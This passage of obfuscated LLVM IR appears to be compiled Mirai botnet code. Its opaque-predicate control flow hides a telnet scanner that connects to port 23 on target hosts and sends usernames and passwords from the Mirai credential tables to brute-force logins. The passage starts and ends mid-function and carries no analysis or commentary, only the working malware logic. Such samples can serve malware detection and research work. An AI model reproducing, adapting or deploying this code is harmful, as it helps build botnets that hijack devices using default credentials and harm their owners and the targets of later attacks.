originalBB35:                                     ; preds = %originalBB35alteredBB, %300
  %309 = load i32, i32* @x.73
  %310 = load i32, i32* @y.74
  %311 = sub i32 %309, 1
  %312 = mul i32 %309, %311
  %313 = urem i32 %312, 2
  %314 = icmp eq i32 %313, 0
  %315 = icmp slt i32 %310, 10
  %316 = or i1 %314, %315
  br i1 %316, label %originalBBpart237, label %originalBB35alteredBB

originalBBpart237:                                ; preds = %originalBB35
  br label %317

; <label>:317:                                    ; preds = %originalBBpart237, %169
  %318 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %318, align 4
  %319 = call zeroext i16 @htons(i16 zeroext 23) #10
  %320 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %319, i16* %320, align 2
  %321 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %322 = getelementptr inbounds [8 x i8], [8 x i8]* %321, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %322, i8 0, i64 8, i32 4, i1 false)
  %323 = load i32, i32* %6, align 4
  %324 = sext i32 %323 to i64
  %325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %324
  %326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %325, i32 0, i32 1
  %327 = load i32, i32* %326, align 4
  %328 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %329 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %328, i32 0, i32 0
  store i32 %327, i32* %329, align 4
  %330 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %331 = load i32, i32* %6, align 4
  %332 = sext i32 %331 to i64
  %333 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %332
  %334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %333, i32 0, i32 0
  store i32 %330, i32* %334, align 16
  %335 = load i32, i32* %6, align 4
  %336 = sext i32 %335 to i64
  %337 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %336
  %338 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %337, i32 0, i32 0
  %339 = load i32, i32* %338, align 16
  %340 = icmp eq i32 %339, -1
  br i1 %340, label %341, label %342

; <label>:341:                                    ; preds = %317
  br label %1372

; <label>:342:                                    ; preds = %317
  %343 = load i32, i32* %6, align 4
  %344 = sext i32 %343 to i64
  %345 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %344
  %346 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %345, i32 0, i32 0
  %347 = load i32, i32* %346, align 16
  %348 = load i32, i32* %6, align 4
  %349 = sext i32 %348 to i64
  %350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %349
  %351 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %350, i32 0, i32 0
  %352 = load i32, i32* %351, align 16
  %353 = call i32 (i32, i32, ...) @fcntl(i32 %352, i32 3, i8* null)
  %354 = or i32 %353, 2048
  %355 = call i32 (i32, i32, ...) @fcntl(i32 %347, i32 4, i32 %354)
  %356 = load i32, i32* %6, align 4
  %357 = sext i32 %356 to i64
  %358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %357
  %359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %358, i32 0, i32 0
  %360 = load i32, i32* %359, align 16
  %361 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %362 = call i32 @connect(i32 %360, %struct.sockaddr* %361, i32 16)
  %363 = icmp eq i32 %362, -1
  br i1 %363, label %364, label %372

; <label>:364:                                    ; preds = %342
  %365 = call i32* @__errno_location() #10
  %366 = load i32, i32* %365, align 4
  %367 = icmp ne i32 %366, 115
  br i1 %367, label %368, label %372

; <label>:368:                                    ; preds = %364
  %369 = load i32, i32* %6, align 4
  %370 = sext i32 %369 to i64
  %371 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %370
  call void @reset_telstate(%struct.telstate_t* %371)
  br label %376

; <label>:372:                                    ; preds = %364, %342
  %373 = load i32, i32* %6, align 4
  %374 = sext i32 %373 to i64
  %375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %374
  call void @advance_telstate(%struct.telstate_t* %375, i32 1)
  br label %376

; <label>:376:                                    ; preds = %372, %368
  br label %1355

; <label>:377:                                    ; preds = %154
  br label %378

; <label>:378:                                    ; preds = %377
  %379 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %380 = getelementptr inbounds [16 x i64], [16 x i64]* %379, i64 0, i64 0
  %381 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %380) #5, !srcloc !6
  %382 = extractvalue { i64, i64* } %381, 0
  %383 = extractvalue { i64, i64* } %381, 1
  %384 = trunc i64 %382 to i32
  store i32 %384, i32* %21, align 4
  %385 = ptrtoint i64* %383 to i64
  %386 = trunc i64 %385 to i32
  store i32 %386, i32* %22, align 4
  br label %387

; <label>:387:                                    ; preds = %378
  br label %388

; <label>:388:                                    ; preds = %387
  %389 = load i32, i32* %6, align 4
  %390 = sext i32 %389 to i64
  %391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %390
  %392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %391, i32 0, i32 0
  %393 = load i32, i32* %392, align 16
  %394 = srem i32 %393, 64
  %395 = zext i32 %394 to i64
  %396 = shl i64 1, %395
  %397 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %398 = load i32, i32* %6, align 4
  %399 = sext i32 %398 to i64
  %400 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %399
  %401 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %400, i32 0, i32 0
  %402 = load i32, i32* %401, align 16
  %403 = sdiv i32 %402, 64
  %404 = sext i32 %403 to i64
  %405 = getelementptr inbounds [16 x i64], [16 x i64]* %397, i64 0, i64 %404
  %406 = load i64, i64* %405, align 8
  %407 = or i64 %406, %396
  store i64 %407, i64* %405, align 8
  %408 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %408, align 8
  %409 = load i32, i32* %3, align 4
  %410 = sext i32 %409 to i64
  %411 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %410, i64* %411, align 8
  %412 = load i32, i32* %6, align 4
  %413 = sext i32 %412 to i64
  %414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %413
  %415 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %414, i32 0, i32 0
  %416 = load i32, i32* %415, align 16
  %417 = add nsw i32 %416, 1
  %418 = call i32 @select(i32 %417, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %418, i32* %7, align 4
  %419 = load i32, i32* %7, align 4
  %420 = icmp eq i32 %419, 1
  br i1 %420, label %421, label %475

; <label>:421:                                    ; preds = %388
  %422 = load i32, i32* @x.73
  %423 = load i32, i32* @y.74
  %424 = sub i32 %422, 1
  %425 = mul i32 %422, %424
  %426 = urem i32 %425, 2
  %427 = icmp eq i32 %426, 0
  %428 = icmp slt i32 %423, 10
  %429 = or i1 %427, %428
  br i1 %429, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %421
  %430 = call i64 @time(i64* null) #5
  %431 = trunc i64 %430 to i32
  %432 = load i32, i32* %6, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %433
  %435 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %434, i32 0, i32 7
  store i32 %431, i32* %435, align 16
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %436 = load i32, i32* %6, align 4
  %437 = sext i32 %436 to i64
  %438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %437
  %439 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %438, i32 0, i32 0
  %440 = load i32, i32* %439, align 16
  %441 = bitcast i32* %15 to i8*
  %442 = call i32 @getsockopt(i32 %440, i32 1, i32 4, i8* %441, i32* %14) #5
  %443 = load i32, i32* %15, align 4
  %444 = icmp ne i32 %443, 0
  %445 = load i32, i32* @x.73
  %446 = load i32, i32* @y.74
  %447 = sub i32 %445, 1
  %448 = mul i32 %445, %447
  %449 = urem i32 %448, 2
  %450 = icmp eq i32 %449, 0
  %451 = icmp slt i32 %446, 10
  %452 = or i1 %450, %451
  br i1 %452, label %originalBBpart241, label %originalBB39alteredBB

originalBBpart241:                                ; preds = %originalBB39
  br i1 %444, label %453, label %457

; <label>:453:                                    ; preds = %originalBBpart241
  %454 = load i32, i32* %6, align 4
  %455 = sext i32 %454 to i64
  %456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %455
  call void @reset_telstate(%struct.telstate_t* %456)
  br label %474

; <label>:457:                                    ; preds = %originalBBpart241
  %458 = load i32, i32* %6, align 4
  %459 = sext i32 %458 to i64
  %460 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %459
  %461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %460, i32 0, i32 0
  %462 = load i32, i32* %461, align 16
  %463 = load i32, i32* %6, align 4
  %464 = sext i32 %463 to i64
  %465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %464
  %466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %465, i32 0, i32 0
  %467 = load i32, i32* %466, align 16
  %468 = call i32 (i32, i32, ...) @fcntl(i32 %467, i32 3, i8* null)
  %469 = and i32 %468, -2049
  %470 = call i32 (i32, i32, ...) @fcntl(i32 %462, i32 4, i32 %469)
  %471 = load i32, i32* %6, align 4
  %472 = sext i32 %471 to i64
  %473 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %472
  call void @advance_telstate(%struct.telstate_t* %473, i32 2)
  br label %474

; <label>:474:                                    ; preds = %457, %453
  br label %1372

; <label>:475:                                    ; preds = %388
  %476 = load i32, i32* %7, align 4
  %477 = icmp eq i32 %476, -1
  br i1 %477, label %478, label %498

; <label>:478:                                    ; preds = %475
  %479 = load i32, i32* @x.73
  %480 = load i32, i32* @y.74
  %481 = sub i32 %479, 1
  %482 = mul i32 %479, %481
  %483 = urem i32 %482, 2
  %484 = icmp eq i32 %483, 0
  %485 = icmp slt i32 %480, 10
  %486 = or i1 %484, %485
  br i1 %486, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %478
  %487 = load i32, i32* %6, align 4
  %488 = sext i32 %487 to i64
  %489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %488
  call void @reset_telstate(%struct.telstate_t* %489)
  %490 = load i32, i32* @x.73
  %491 = load i32, i32* @y.74
  %492 = sub i32 %490, 1
  %493 = mul i32 %490, %492
  %494 = urem i32 %493, 2
  %495 = icmp eq i32 %494, 0
  %496 = icmp slt i32 %491, 10
  %497 = or i1 %495, %496
  br i1 %497, label %originalBBpart245, label %originalBB43alteredBB

originalBBpart245:                                ; preds = %originalBB43
  br label %1372

; <label>:498:                                    ; preds = %475
  br label %499

; <label>:499:                                    ; preds = %498
  %500 = load i32, i32* %6, align 4
  %501 = sext i32 %500 to i64
  %502 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %501
  %503 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %502, i32 0, i32 7
  %504 = load i32, i32* %503, align 16
  %505 = add i32 %504, 7
  %506 = zext i32 %505 to i64
  %507 = call i64 @time(i64* null) #5
  %508 = icmp slt i64 %506, %507
  br i1 %508, label %509, label %529

; <label>:509:                                    ; preds = %499
  %510 = load i32, i32* @x.73
  %511 = load i32, i32* @y.74
  %512 = sub i32 %510, 1
  %513 = mul i32 %510, %512
  %514 = urem i32 %513, 2
  %515 = icmp eq i32 %514, 0
  %516 = icmp slt i32 %511, 10
  %517 = or i1 %515, %516
  br i1 %517, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %509
  %518 = load i32, i32* %6, align 4
  %519 = sext i32 %518 to i64
  %520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %519
  call void @reset_telstate(%struct.telstate_t* %520)
  %521 = load i32, i32* @x.73
  %522 = load i32, i32* @y.74
  %523 = sub i32 %521, 1
  %524 = mul i32 %521, %523
  %525 = urem i32 %524, 2
  %526 = icmp eq i32 %525, 0
  %527 = icmp slt i32 %522, 10
  %528 = or i1 %526, %527
  br i1 %528, label %originalBBpart249, label %originalBB47alteredBB

originalBBpart249:                                ; preds = %originalBB47
  br label %529

; <label>:529:                                    ; preds = %originalBBpart249, %499
  br label %1355

; <label>:530:                                    ; preds = %154
  %531 = load i32, i32* %6, align 4
  %532 = sext i32 %531 to i64
  %533 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %532
  %534 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %533, i32 0, i32 0
  %535 = load i32, i32* %534, align 16
  %536 = load i32, i32* %3, align 4
  %537 = load i32, i32* %6, align 4
  %538 = sext i32 %537 to i64
  %539 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %538
  %540 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %539, i32 0, i32 9
  %541 = load i8*, i8** %540, align 8
  %542 = call i32 @read_until_response(i32 %535, i32 %536, i8* %541, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i32 0, i32 0))
  %543 = icmp ne i32 %542, 0
  br i1 %543, label %544, label %615

; <label>:544:                                    ; preds = %530
  %545 = load i32, i32* @x.73
  %546 = load i32, i32* @y.74
  %547 = sub i32 %545, 1
  %548 = mul i32 %545, %547
  %549 = urem i32 %548, 2
  %550 = icmp eq i32 %549, 0
  %551 = icmp slt i32 %546, 10
  %552 = or i1 %550, %551
  br i1 %552, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %544
  %553 = call i64 @time(i64* null) #5
  %554 = trunc i64 %553 to i32
  %555 = load i32, i32* %6, align 4
  %556 = sext i32 %555 to i64
  %557 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %556
  %558 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %557, i32 0, i32 7
  store i32 %554, i32* %558, align 16
  %559 = load i32, i32* %6, align 4
  %560 = sext i32 %559 to i64
  %561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %560
  %562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %561, i32 0, i32 9
  %563 = load i8*, i8** %562, align 8
  %564 = call i32 @contains_fail(i8* %563)
  %565 = icmp ne i32 %564, 0
  %566 = load i32, i32* @x.73
  %567 = load i32, i32* @y.74
  %568 = sub i32 %566, 1
  %569 = mul i32 %566, %568
  %570 = urem i32 %569, 2
  %571 = icmp eq i32 %570, 0
  %572 = icmp slt i32 %567, 10
  %573 = or i1 %571, %572
  br i1 %573, label %originalBBpart253, label %originalBB51alteredBB

originalBBpart253:                                ; preds = %originalBB51
  br i1 %565, label %574, label %594

; <label>:574:                                    ; preds = %originalBBpart253
  %575 = load i32, i32* @x.73
  %576 = load i32, i32* @y.74
  %577 = sub i32 %575, 1
  %578 = mul i32 %575, %577
  %579 = urem i32 %578, 2
  %580 = icmp eq i32 %579, 0
  %581 = icmp slt i32 %576, 10
  %582 = or i1 %580, %581
  br i1 %582, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %574
  %583 = load i32, i32* %6, align 4
  %584 = sext i32 %583 to i64
  %585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %584
  call void @advance_telstate(%struct.telstate_t* %585, i32 0)
  %586 = load i32, i32* @x.73
  %587 = load i32, i32* @y.74
  %588 = sub i32 %586, 1
  %589 = mul i32 %586, %588
  %590 = urem i32 %589, 2
  %591 = icmp eq i32 %590, 0
  %592 = icmp slt i32 %587, 10
  %593 = or i1 %591, %592
  br i1 %593, label %originalBBpart257, label %originalBB55alteredBB

originalBBpart257:                                ; preds = %originalBB55
  br label %598

; <label>:594:                                    ; preds = %originalBBpart253
  %595 = load i32, i32* %6, align 4
  %596 = sext i32 %595 to i64
  %597 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %596
  call void @advance_telstate(%struct.telstate_t* %597, i32 3)
  br label %598

; <label>:598:                                    ; preds = %594, %originalBBpart257
  %599 = load i32, i32* @x.73
  %600 = load i32, i32* @y.74
  %601 = sub i32 %599, 1
  %602 = mul i32 %599, %601
  %603 = urem i32 %602, 2
  %604 = icmp eq i32 %603, 0
  %605 = icmp slt i32 %600, 10
  %606 = or i1 %604, %605
  br i1 %606, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %598
  %607 = load i32, i32* @x.73
  %608 = load i32, i32* @y.74
  %609 = sub i32 %607, 1
  %610 = mul i32 %607, %609
  %611 = urem i32 %610, 2
  %612 = icmp eq i32 %611, 0
  %613 = icmp slt i32 %608, 10
  %614 = or i1 %612, %613
  br i1 %614, label %originalBBpart261, label %originalBB59alteredBB

originalBBpart261:                                ; preds = %originalBB59
  br label %1372

; <label>:615:                                    ; preds = %530
  %616 = load i32, i32* @x.73
  %617 = load i32, i32* @y.74
  %618 = sub i32 %616, 1
  %619 = mul i32 %616, %618
  %620 = urem i32 %619, 2
  %621 = icmp eq i32 %620, 0
  %622 = icmp slt i32 %617, 10
  %623 = or i1 %621, %622
  br i1 %623, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %615
  %624 = load i32, i32* %6, align 4
  %625 = sext i32 %624 to i64
  %626 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %625
  %627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %626, i32 0, i32 7
  %628 = load i32, i32* %627, align 16
  %629 = add i32 %628, 7
  %630 = zext i32 %629 to i64
  %631 = call i64 @time(i64* null) #5
  %632 = icmp slt i64 %630, %631
  %633 = load i32, i32* @x.73
  %634 = load i32, i32* @y.74
  %635 = sub i32 %633, 1
  %636 = mul i32 %633, %635
  %637 = urem i32 %636, 2
  %638 = icmp eq i32 %637, 0
  %639 = icmp slt i32 %634, 10
  %640 = or i1 %638, %639
  br i1 %640, label %originalBBpart280, label %originalBB63alteredBB

originalBBpart280:                                ; preds = %originalBB63
  br i1 %632, label %641, label %661

; <label>:641:                                    ; preds = %originalBBpart280
  %642 = load i32, i32* @x.73
  %643 = load i32, i32* @y.74
  %644 = sub i32 %642, 1
  %645 = mul i32 %642, %644
  %646 = urem i32 %645, 2
  %647 = icmp eq i32 %646, 0
  %648 = icmp slt i32 %643, 10
  %649 = or i1 %647, %648
  br i1 %649, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %641
  %650 = load i32, i32* %6, align 4
  %651 = sext i32 %650 to i64
  %652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %651
  call void @reset_telstate(%struct.telstate_t* %652)
  %653 = load i32, i32* @x.73
  %654 = load i32, i32* @y.74
  %655 = sub i32 %653, 1
  %656 = mul i32 %653, %655
  %657 = urem i32 %656, 2
  %658 = icmp eq i32 %657, 0
  %659 = icmp slt i32 %654, 10
  %660 = or i1 %658, %659
  br i1 %660, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br label %661

; <label>:661:                                    ; preds = %originalBBpart284, %originalBBpart280
  br label %1355

; <label>:662:                                    ; preds = %154
  %663 = load i32, i32* %6, align 4
  %664 = sext i32 %663 to i64
  %665 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %664
  %666 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %665, i32 0, i32 0
  %667 = load i32, i32* %666, align 16
  %668 = load i32, i32* %6, align 4
  %669 = sext i32 %668 to i64
  %670 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %669
  %671 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %670, i32 0, i32 4
  %672 = load i8, i8* %671, align 2
  %673 = zext i8 %672 to i64
  %674 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Usernames, i64 0, i64 %673
  %675 = load i8*, i8** %674, align 8
  %676 = load i32, i32* %6, align 4
  %677 = sext i32 %676 to i64
  %678 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %677
  %679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %678, i32 0, i32 4
  %680 = load i8, i8* %679, align 2
  %681 = zext i8 %680 to i64
  %682 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Usernames, i64 0, i64 %681
  %683 = load i8*, i8** %682, align 8
  %684 = call i64 @strlen(i8* %683) #9
  %685 = call i64 @send(i32 %667, i8* %675, i64 %684, i32 16384)
  %686 = icmp slt i64 %685, 0
  br i1 %686, label %687, label %691

; <label>:687:                                    ; preds = %662
  %688 = load i32, i32* %6, align 4
  %689 = sext i32 %688 to i64
  %690 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %689
  call void @reset_telstate(%struct.telstate_t* %690)
  br label %1372

; <label>:691:                                    ; preds = %662
  %692 = load i32, i32* %6, align 4
  %693 = sext i32 %692 to i64
  %694 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %693
  %695 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %694, i32 0, i32 0
  %696 = load i32, i32* %695, align 16
  %697 = call i64 @send(i32 %696, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.487, i32 0, i32 0), i64 2, i32 16384)
  %698 = icmp slt i64 %697, 0
  br i1 %698, label %699, label %703

; <label>:699:                                    ; preds = %691
  %700 = load i32, i32* %6, align 4
  %701 = sext i32 %700 to i64
  %702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %701
  call void @reset_telstate(%struct.telstate_t* %702)
  br label %1372

; <label>:703:                                    ; preds = %691
  %704 = load i32, i32* %6, align 4
  %705 = sext i32 %704 to i64
  %706 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %705
  call void @advance_telstate(%struct.telstate_t* %706, i32 4)
  br label %1355

; <label>:707:                                    ; preds = %154
  %708 = load i32, i32* %6, align 4
  %709 = sext i32 %708 to i64
  %710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %709
  %711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %710, i32 0, i32 0
  %712 = load i32, i32* %711, align 16
  %713 = load i32, i32* %3, align 4
  %714 = load i32, i32* %6, align 4
  %715 = sext i32 %714 to i64
  %716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %715
  %717 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %716, i32 0, i32 9
  %718 = load i8*, i8** %717, align 8
  %719 = call i32 @read_until_response(i32 %712, i32 %713, i8* %718, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i32 0, i32 0))
  %720 = icmp ne i32 %719, 0
  br i1 %720, label %721, label %760

; <label>:721:                                    ; preds = %707
  %722 = call i64 @time(i64* null) #5
  %723 = trunc i64 %722 to i32
  %724 = load i32, i32* %6, align 4
  %725 = sext i32 %724 to i64
  %726 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %725
  %727 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %726, i32 0, i32 7
  store i32 %723, i32* %727, align 16
  %728 = load i32, i32* %6, align 4
  %729 = sext i32 %728 to i64
  %730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %729
  %731 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %730, i32 0, i32 9
  %732 = load i8*, i8** %731, align 8
  %733 = call i32 @contains_fail(i8* %732)
  %734 = icmp ne i32 %733, 0
  br i1 %734, label %735, label %739

; <label>:735:                                    ; preds = %721
  %736 = load i32, i32* %6, align 4
  %737 = sext i32 %736 to i64
  %738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %737
  call void @advance_telstate(%struct.telstate_t* %738, i32 0)
  br label %759

; <label>:739:                                    ; preds = %721
  %740 = load i32, i32* @x.73
  %741 = load i32, i32* @y.74
  %742 = sub i32 %740, 1
  %743 = mul i32 %740, %742
  %744 = urem i32 %743, 2
  %745 = icmp eq i32 %744, 0
  %746 = icmp slt i32 %741, 10
  %747 = or i1 %745, %746
  br i1 %747, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %739
  %748 = load i32, i32* %6, align 4
  %749 = sext i32 %748 to i64
  %750 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %749
  call void @advance_telstate(%struct.telstate_t* %750, i32 5)
  %751 = load i32, i32* @x.73
  %752 = load i32, i32* @y.74
  %753 = sub i32 %751, 1
  %754 = mul i32 %751, %753
  %755 = urem i32 %754, 2
  %756 = icmp eq i32 %755, 0
  %757 = icmp slt i32 %752, 10
  %758 = or i1 %756, %757
  br i1 %758, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br label %759

; <label>:759:                                    ; preds = %originalBBpart288, %735
  br label %1372

; <label>:760:                                    ; preds = %707
  %761 = load i32, i32* %6, align 4
  %762 = sext i32 %761 to i64
  %763 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %762
  %764 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %763, i32 0, i32 7
  %765 = load i32, i32* %764, align 16
  %766 = add i32 %765, 7
  %767 = zext i32 %766 to i64
  %768 = call i64 @time(i64* null) #5
  %769 = icmp slt i64 %767, %768
  br i1 %769, label %770, label %774

; <label>:770:                                    ; preds = %760
  %771 = load i32, i32* %6, align 4
  %772 = sext i32 %771 to i64
  %773 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %772
  call void @reset_telstate(%struct.telstate_t* %773)
  br label %774

; <label>:774:                                    ; preds = %770, %760
  %775 = load i32, i32* @x.73
  %776 = load i32, i32* @y.74
  %777 = sub i32 %775, 1
  %778 = mul i32 %775, %777
  %779 = urem i32 %778, 2
  %780 = icmp eq i32 %779, 0
  %781 = icmp slt i32 %776, 10
  %782 = or i1 %780, %781
  br i1 %782, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %774
  %783 = load i32, i32* @x.73
  %784 = load i32, i32* @y.74
  %785 = sub i32 %783, 1
  %786 = mul i32 %783, %785
  %787 = urem i32 %786, 2
  %788 = icmp eq i32 %787, 0
  %789 = icmp slt i32 %784, 10
  %790 = or i1 %788, %789
  br i1 %790, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br label %1355

; <label>:791:                                    ; preds = %154
  %792 = load i32, i32* @x.73
  %793 = load i32, i32* @y.74
  %794 = sub i32 %792, 1
  %795 = mul i32 %792, %794
  %796 = urem i32 %795, 2
  %797 = icmp eq i32 %796, 0
  %798 = icmp slt i32 %793, 10
  %799 = or i1 %797, %798
  br i1 %799, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %791
  %800 = load i32, i32* %6, align 4
  %801 = sext i32 %800 to i64
  %802 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %801
  %803 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %802, i32 0, i32 0
  %804 = load i32, i32* %803, align 16
  %805 = load i32, i32* %6, align 4
  %806 = sext i32 %805 to i64
  %807 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %806
  %808 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %807, i32 0, i32 5
  %809 = load i8, i8* %808, align 1
  %810 = zext i8 %809 to i64
  %811 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Passwords, i64 0, i64 %810
  %812 = load i8*, i8** %811, align 8
  %813 = load i32, i32* %6, align 4
  %814 = sext i32 %813 to i64
  %815 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %814
  %816 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %815, i32 0, i32 5
  %817 = load i8, i8* %816, align 1
  %818 = zext i8 %817 to i64
  %819 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Passwords, i64 0, i64 %818
  %820 = load i8*, i8** %819, align 8
  %821 = call i64 @strlen(i8* %820) #9
  %822 = call i64 @send(i32 %804, i8* %812, i64 %821, i32 16384)
  %823 = icmp slt i64 %822, 0
  %824 = load i32, i32* @x.73
  %825 = load i32, i32* @y.74
  %826 = sub i32 %824, 1
  %827 = mul i32 %824, %826
  %828 = urem i32 %827, 2
  %829 = icmp eq i32 %828, 0
  %830 = icmp slt i32 %825, 10
  %831 = or i1 %829, %830
  br i1 %831, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br i1 %823, label %832, label %836

; <label>:832:                                    ; preds = %originalBBpart296
  %833 = load i32, i32* %6, align 4
  %834 = sext i32 %833 to i64
